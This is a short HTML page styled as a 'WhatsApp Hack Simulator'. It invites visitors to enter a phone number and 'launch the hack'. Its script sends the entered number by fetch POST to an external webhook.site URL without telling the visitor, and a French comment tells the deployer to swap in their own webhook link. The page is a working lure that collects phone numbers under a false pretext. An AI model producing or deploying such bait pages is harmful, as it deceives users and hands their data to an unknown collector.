<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Hacker - Fake Demo</title>
  <style>
    body {
      background: linear-gradient(to right, #1f1f1f, #2b2b2b);
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 28px;
    }
    input[type="text"] {
      padding: 10px;
      font-size: 16px;
      width: 300px;
      margin-bottom: 20px;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #4caf50;
      border: none;
      border-radius: 5px;
      color: #fff;
      cursor: pointer;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h1>WhatsApp Hack Simulator</h1>
  <input type="text" id="number" placeholder="+27681600073.">
  <button onclick="sendData()">Lancer le piratage</button>

  <script>
    function sendData() {
      const number = document.getElementById('number').value;
      fetch('https://webhook.site/b9f721df-4883-411d-812a-a57a3fd1e879', {  // Remplace avec ton vrai lien Webhook
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ whatsapp_number: number })
      })
      .then(response => alert('Données envoyées au serveur.'))
      .catch(error => alert('Erreur : ' + error));
    }
  </script>
</body>
</html>
